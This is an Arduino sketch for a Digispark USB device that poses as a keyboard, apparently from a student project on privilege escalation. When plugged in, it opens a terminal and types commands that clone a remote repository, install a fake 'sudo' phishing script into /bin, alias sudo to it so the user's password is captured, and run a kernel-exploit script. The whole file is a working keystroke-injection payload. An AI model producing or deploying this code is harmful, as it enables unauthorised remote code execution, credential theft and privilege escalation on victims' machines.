#include "DigiKeyboard.h"
void setup() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("Terminal");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("git clone https://github.com/Jidnyesh/Final-Project-Priv-Escalation.git && cd Final-Project-Priv-Escalation/fake-sudo && chmod +x sudo_phishing.sh && cp sudo_phishing.sh /bin/sudo_phishing.sh && chmod 777 /bin/sudo_phishing.sh && echo \"alias sudo='/bin/sudo_phishing.sh'\" >> ~/.bash_aliases && source ~/.bash_aliases && . ~/.bash_aliases && cd ../Final-Project-Priv-Escalation/kernel-exploits && python main.py");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(4000);

}

void loop() {
}